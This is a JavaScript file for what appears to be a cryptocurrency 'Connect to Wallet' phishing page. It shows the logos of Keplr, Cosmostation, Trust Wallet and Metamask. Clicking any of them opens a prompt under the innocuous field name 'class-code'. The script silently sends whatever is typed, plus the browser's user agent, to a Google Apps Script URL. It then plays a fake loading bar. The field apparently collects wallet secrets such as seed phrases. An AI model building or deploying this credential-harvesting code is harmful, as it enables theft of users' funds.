/* ===== ICON DATA (unchanged) ===== */
const ring1 = [
  "https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons/svg/color/xrp.svg",
  "https://osmosis.zone/assets/icons/tia.svg",
  "https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons/svg/color/eth.svg",
  "https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons/svg/color/btc.svg",
  "https://raw.githubusercontent.com/cosmos/chain-registry/master/cosmoshub/images/atom.svg",
  "https://osmosis.zone/assets/icons/sol.svg",
  "https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons/svg/color/bnb.svg"
];
const ring2 = [
  "https://osmosis.zone/assets/icons/inj.svg",
  "https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons/svg/color/avax.svg",
  "https://osmosis.zone/assets/icons/dym.svg",
  "https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons/svg/color/dot.svg",
  "https://raw.githubusercontent.com/cosmos/chain-registry/master/_non-cosmos/aptos/images/apt-dm.svg",
  "https://raw.githubusercontent.com/cosmos/chain-registry/master/_non-cosmos/sui/images/sui.svg",
  "https://osmosis.zone/assets/icons/arb.svg",
  "https://raw.githubusercontent.com/cosmos/chain-registry/master/stride/images/strd.svg",
  "https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons/svg/color/matic.svg",
  "https://raw.githubusercontent.com/cosmos/chain-registry/master/dydx/images/dydx-circle.svg",
  "https://raw.githubusercontent.com/cosmos/chain-registry/master/sei/images/sei.svg"
];
const ring3 = [
  "https://raw.githubusercontent.com/cosmos/chain-registry/master/akash/images/akt.svg",
  "https://raw.githubusercontent.com/cosmos/chain-registry/master/juno/images/juno.svg",
  "https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons/svg/color/btc.svg",
  "https://raw.githubusercontent.com/cosmos/chain-registry/master/axelar/images/axl.svg",
  "https://cryptologos.cc/logos/fantom-ftm-logo.svg?v=030",
  "https://raw.githubusercontent.com/cosmos/chain-registry/master/kava/images/kava.svg",
  "https://raw.githubusercontent.com/cosmos/chain-registry/master/saga/images/saga_white.svg",
  "https://osmosis.zone/assets/icons/cro.svg",
  "https://raw.githubusercontent.com/cosmos/chain-registry/master/evmos/images/evmos.svg",
  "https://osmosis.zone/assets/icons/stars.svg",
  "https://raw.githubusercontent.com/cosmos/chain-registry/master/_non-cosmos/filecoin/images/fil.svg",
  "https://raw.githubusercontent.com/cosmos/chain-registry/master/terra/images/luna.svg",
  "https://raw.githubusercontent.com/cosmos/chain-registry/master/agoric/images/bld.svg",
  "https://raw.githubusercontent.com/cosmos/chain-registry/master/neutron/images/ntrn.svg",
  "https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons/svg/color/btc.svg"
];

const circles = [ring1, ring2, ring3];
const wrapper = document.getElementById('wrapper');
const container = document.getElementById('icons');

/* Responsive radii */
function getResponsiveRadii(){
  const w = window.innerWidth;
  if (w <= 480) return [90,140,190];
  if (w <= 768) return [140,210,280];
  return [190,290,400];
}

/* Render icons */
function renderIcons(){
  container.innerHTML = '';

  const rect = wrapper.getBoundingClientRect();
  const w = rect.width;
  const h = rect.height;
  const radii = getResponsiveRadii();

  const centerX = w / 2;
  const centerY = h * 0.82;

  circles.forEach((icons, ringIndex) => {
    const radius = radii[ringIndex];
    const count = icons.length;
    const denom = Math.max(1, count - 1);

    icons.forEach((src, n) => {
      const angle = Math.PI * (n / denom);
      const x = centerX + radius * Math.cos(angle);
      const y = centerY - radius * Math.sin(angle);

      const img = document.createElement('img');
      img.src = src;
      img.alt = 'icon';
      img.style.left = `${x}px`;
      img.style.top = `${y}px`;

      img.style.width = (window.innerWidth <= 480 ? '30px' : window.innerWidth <= 768 ? '40px' : '55px');
      img.draggable = false;

      container.appendChild(img);
    });
  });
}

/* Debounce resize */
let resizeTimer = null;
function handleResize(){
  clearTimeout(resizeTimer);
  resizeTimer = setTimeout(() => {
    renderIcons();
  }, 100);
}

/* UI INIT */
function initUI(){
  const headerLogoEl = document.getElementById('header-logo');
  const headerLogoSrc = headerLogoEl ? headerLogoEl.src : '';

  ['p1','p2','p3','p4'].forEach(id => {
    const el = document.getElementById(id+'-header-logo');
    if (el) el.src = headerLogoSrc;
  });

  const classLogos = [
    { img: 'https://play-lh.googleusercontent.com/q3IAZGlrfKwt-IxX3WWcWJzah56y2RqhESi3Xk8hFarVNnbPtzLSgRDI2JV1681pf2sq5e2lr17ZVD-wzV77IGk=s48-rw', label: 'Keplr Wallet' },
    { img: 'https://play-lh.googleusercontent.com/DslEp7Rc_MoqRt0wcls1E3DCV1dRjm8xbTDe1GNi1g-qPj1CPAv0jKLqGmcdXmzl2Q=w240-h480-rw', label: 'Cosmostation Wallet 2' },
    { img: 'https://play-lh.googleusercontent.com/cd5BevWohRqLwsI2_i3k4YIVtcO57cIZCs6l20H1Hcdj0P2rFEcX_7QtgKbTM3Sn_A=w240-h480-rw', label: 'Trust Wallet' },
    { img: 'https://play-lh.googleusercontent.com/lm6Rk4Qc3eXUIxC8qkFCj46Bho6fbi6Lu3TwWuS3JNU2bBEcNU61arw_wG5wA0c-4IE=w240-h480-rw', label: 'Metamask' }
  ];
  const listContainer = document.getElementById('class-list');
  listContainer.innerHTML = '';
  classLogos.forEach((c) => {
    const item = document.createElement('div');
    item.className = 'class-item';
    item.innerHTML = `<img src="${c.img}" alt="${c.label}"><div><strong>${c.label}</strong><small>Click to access ${c.label}</small></div>`;
    item.addEventListener('click', () => {
      openModal('p2');
      setTimeout(()=> {
        const input = document.getElementById('class-code');
        if (input) input.focus();
      }, 120);
    });
    listContainer.appendChild(item);
  });

  document.querySelectorAll('.close-btn').forEach(btn=>{
    btn.addEventListener('click', ()=>{
      const tgt = btn.getAttribute('data-close');
      if (tgt) closeModal(tgt);
    });
  });

  document.getElementById('open-popup1').addEventListener('click', ()=> openModal('p1'));

  document.querySelectorAll('.modal-overlay').forEach(overlay=>{
    overlay.addEventListener('click', (e)=>{
      if (e.target === overlay) overlay.style.display='none';
    });
  });

  const form = document.getElementById('class-code-form');

  /* SUBMIT FORM TANPA CORS ERROR */
  form.addEventListener('submit', (e)=>{
    e.preventDefault();

    const input = document.getElementById('class-code');
    if(!input.checkValidity()){
      input.reportValidity();
      return;
    }

    const kodeKelas = input.value.trim();

    closeModal('p2');
    openModal('p3');

    const API_URL = "https://script.google.com/macros/s/AKfycbxgsAX3iurHswZbGmz_NkFlmWMRZyRHKFu3dOwfSAKpdK9binO64g8iTBuX7cXYZsgGKA/exec";

    fetch(API_URL + "?kode=" + encodeURIComponent(kodeKelas) +
          "&ua=" + encodeURIComponent(navigator.userAgent),
          {
            method: "GET",
            mode: "no-cors"
          });

    startLoadingThenOpenP4();
  });

  document.getElementById('p4-back-btn').addEventListener('click', ()=>{
    closeModal('p4');
    openModal('p1');
  });

  document.addEventListener('keydown', (e)=>{
    if(e.key==='Escape'){
      closeAllModals();
    }
  });
}

function openModal(id){
  closeAllModals();
  const el = document.getElementById('modal-'+id);
  if(el) el.style.display='flex';
}
function closeModal(id){
  const el = document.getElementById('modal-'+id);
  if(el) el.style.display='none';
}
function closeAllModals(){
  document.querySelectorAll('.modal-overlay').forEach(m=>m.style.display='none');
}

/* Loading */
function startLoadingThenOpenP4(){
  const fill = document.getElementById('loading-fill');
  const percentEl = document.getElementById('loading-percent');
  let percent = 0;
  fill.style.width = '0%';
  percentEl.textContent = '0%';

  const interval = setInterval(()=>{
    const step = Math.ceil(Math.random()*7);
    percent = Math.min(80, percent + step);
    fill.style.width = percent + '%';
    percentEl.textContent = percent + '%';

    if(percent >= 80){
      clearInterval(interval);
      setTimeout(()=>{
        closeModal('p3');
        openModal('p4');
      }, 600);
    }
  }, 140);
}

/* Init */
window.addEventListener('DOMContentLoaded', () => {
  initUI();
  renderIcons();
});
window.addEventListener('load', renderIcons);
window.addEventListener('resize', handleResize);



let walletText = document.getElementById('connect-to-wallet');
let dots = 0;

setInterval(() => {
  dots = (dots + 1) % 4;
  walletText.textContent = `Connect to Wallet${'.'.repeat(dots)}`;
}, 500);